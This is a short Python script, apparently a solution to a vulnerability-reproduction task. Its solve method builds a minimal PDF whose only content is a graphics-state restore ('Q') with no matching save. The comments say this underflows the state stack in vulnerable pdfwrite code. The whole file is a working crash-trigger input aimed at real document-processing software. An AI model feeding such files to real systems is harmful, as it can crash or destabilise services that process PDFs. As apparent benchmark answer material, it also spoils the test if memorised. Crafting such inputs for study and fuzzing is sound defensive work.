import io
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal PDF that invokes a graphics-state restore (Q)
        # without any corresponding save (q).  This underflows the viewer
        # state stack inside the vulnerable pdfwrite code.
        #
        # Structure:
        #   1 0 obj  - Catalog
        #   2 0 obj  - Pages
        #   3 0 obj  - Single page referring to contents 4 0 obj
        #   4 0 obj  - Content stream: just "Q\n"
        #
        # Offsets and cross-reference table are generated dynamically to
        # make a valid PDF file.
        #
        stream_data = b"Q\n"                       # lone restore operator
        objects = []

        # 1 0 obj: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        objects.append(obj1)

        # 2 0 obj: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        objects.append(obj2)

        # 3 0 obj: Page
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R\n"
            b"/MediaBox [0 0 100 100]\n"
            b"/Contents 4 0 R\n"
            b"/Resources << >>\n"
            b">>\n"
            b"endobj\n"
        )
        objects.append(obj3)

        # 4 0 obj: Content stream containing only "Q\n"
        obj4 = (
            b"4 0 obj\n"
            + b"<< /Length %d >>\n" % len(stream_data)
            + b"stream\n"
            + stream_data
            + b"endstream\n"
            + b"endobj\n"
        )
        objects.append(obj4)

        # Build PDF
        header = b"%PDF-1.3\n%\xFF\xFF\xFF\xFF\n"
        pdf = io.BytesIO()
        pdf.write(header)

        # Record offsets
        offsets = [0]  # entry 0 is the free object
        for obj in objects:
            offsets.append(pdf.tell())
            pdf.write(obj)

        # Cross-reference table
        xref_offset = pdf.tell()
        pdf.write(b"xref\n")
        pdf.write(b"0 %d\n" % (len(offsets)))
        # Entry for object 0
        pdf.write(b"0000000000 65535 f \n")
        # Entries for objects 1-n
        for off in offsets[1:]:
            pdf.write(b"%010d 00000 n \n" % off)

        # Trailer
        pdf.write(
            b"trailer\n<< /Size %d /Root 1 0 R >>\n" % (len(offsets))
        )
        pdf.write(b"startxref\n")
        pdf.write(b"%d\n" % xref_offset)
        pdf.write(b"%%EOF\n")

        return pdf.getvalue()
